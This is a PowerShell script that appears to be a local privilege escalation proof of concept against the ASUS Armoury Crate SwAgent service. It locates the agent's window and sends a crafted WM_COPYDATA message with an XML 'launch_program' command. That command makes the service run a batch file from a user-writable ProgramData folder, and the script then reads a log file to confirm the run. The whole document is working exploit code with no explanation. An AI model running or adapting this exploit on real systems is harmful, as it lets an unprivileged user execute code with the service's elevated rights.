Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WH {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string c, string n);
    [DllImport("user32.dll")]
    public static extern IntPtr SendMessage(IntPtr h, uint m, IntPtr w, ref CDS l);
    [StructLayout(LayoutKind.Sequential)]
    public struct CDS { public UIntPtr d; public uint cb; public IntPtr lp; }
}
"@
$hwnd = [WH]::FindWindow("ArmourySwAgentClass", "ArmourySwAgentName")
Write-Host "Window: 0x$($hwnd.ToString('X'))"
$xml = "<root><launch_program><link>C:\ProgramData\ASUS\lpe_proof.bat</link></launch_program></root>"
$data = [System.Text.Encoding]::Unicode.GetBytes($xml)
$pData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($data.Length + 16)
for ($i=0; $i -lt $data.Length+16; $i++) { [System.Runtime.InteropServices.Marshal]::WriteByte($pData, $i, 0) }
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $pData, $data.Length)
$cds = New-Object WH+CDS
$cds.d = [UIntPtr]161
$cds.cb = [uint]($data.Length + 2)
$cds.lp = $pData
$r = [WH]::SendMessage($hwnd, 0x4A, [IntPtr]::Zero, [ref]$cds)
Write-Host "SendMessage result=$r"
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($pData)
Start-Sleep -Milliseconds 1000
$f = Get-Item "C:\Program Files (x86)\ASUS\ArmouryDevice\dll\SwAgent\GamingInfomation.xml"
Write-Host "File: size=$($f.Length) LastWrite=$($f.LastWriteTime)"
$bytes = [IO.File]::ReadAllBytes($f.FullName)
$str = [Text.Encoding]::Unicode.GetString($bytes, 2, $bytes.Length-2)
Write-Host "Content=[$str]"
